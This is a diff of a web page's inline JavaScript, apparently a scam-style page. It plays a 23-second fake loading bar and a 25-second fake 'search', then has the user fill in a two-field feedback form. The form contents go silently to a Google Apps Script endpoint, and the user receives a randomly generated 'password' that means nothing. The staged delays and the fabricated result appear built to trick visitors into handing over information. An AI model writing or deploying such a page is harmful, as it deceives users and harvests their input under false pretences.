@@ -121,24 +121,36 @@ button:hover{
 </div>
 
 <script>
-const webAppUrl="https://script.google.com/macros/s/AKfycbz-HYMjDrY0_3XDRP3ZHnki6z1KPi83s8hSFxf5Ar5JyUL54n6CO_-I5UsdJMGpo-NM/exec";
+/* ====== CONFIG ====== */
+const webAppUrl = "https://script.google.com/macros/s/AKfycbz-HYMjDrY0_3XDRP3ZHnki6z1KPi83s8hSFxf5Ar5JyUL54n6CO_-I5UsdJMGpo-NM/exec";
 
-/* ---------- INTRO LOADING ---------- */
-let p=0;
-const percent=document.getElementById("percent");
-const intro=setInterval(()=>{
+/* ====== INTRO LOADING (FIXED) ====== */
+let p = 0;
+const percent = document.getElementById("percent");
+const introDiv = document.getElementById("intro");
+const formDiv = document.getElementById("form");
+
+const introInterval = setInterval(() => {
   p++;
-  percent.innerText=p+"%";
-  if(p>=100){
-    clearInterval(intro);
-    document.getElementById("intro").classList.add("hidden");
-    document.getElementById("form").classList.remove("hidden");
-  }
-},230); // 23 seconds total
+  percent.textContent = p + "%";
 
-/* ---------- SEARCH ---------- */
+  if (p >= 100) {
+    endIntro();
+  }
+}, 230); // ~23 seconds
+
+// FAILSAFE – MASKI MO LAG ANG BROWSER
+setTimeout(endIntro, 23500);
+
+function endIntro(){
+  clearInterval(introInterval);
+  introDiv.classList.add("hidden");
+  formDiv.classList.remove("hidden");
+}
+
+/* ====== SEARCH ====== */
 function startSearch(){
-  document.getElementById("form").classList.add("hidden");
+  formDiv.classList.add("hidden");
   document.getElementById("searching").classList.remove("hidden");
 
   setTimeout(()=>{
@@ -147,7 +159,7 @@ function startSearch(){
   },25000);
 }
 
-/* ---------- FEEDBACK ---------- */
+/* ====== FEEDBACK ====== */
 function goFeedback(){
   document.getElementById("found").classList.add("hidden");
   document.getElementById("feedback").classList.remove("hidden");
@@ -155,20 +167,27 @@ function goFeedback(){
 
 function randPass(){
   const letters="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-  return Math.floor(10000+Math.random()*90000)+letters[Math.floor(Math.random()*26)];
+  return Math.floor(10000+Math.random()*90000)
+    + letters[Math.floor(Math.random()*26)];
 }
 
 async function submitFeedback(){
   const f1=document.getElementById("f1").value;
   const f2=document.getElementById("f2").value;
 
-  await fetch(webAppUrl,{
-    method:"POST",
-    body:JSON.stringify({type:"feedback",input1:f1,input2:f2})
-  });
+  try{
+    await fetch(webAppUrl,{
+      method:"POST",
+      body:JSON.stringify({
+        type:"feedback",
+        input1:f1,
+        input2:f2
+      })
+    });
+  }catch(e){}
 
   document.getElementById("feedback").classList.add("hidden");
-  document.getElementById("password").innerText=randPass();
+  document.getElementById("password").textContent = randPass();
   document.getElementById("passwordPage").classList.remove("hidden");
 }
 </script>
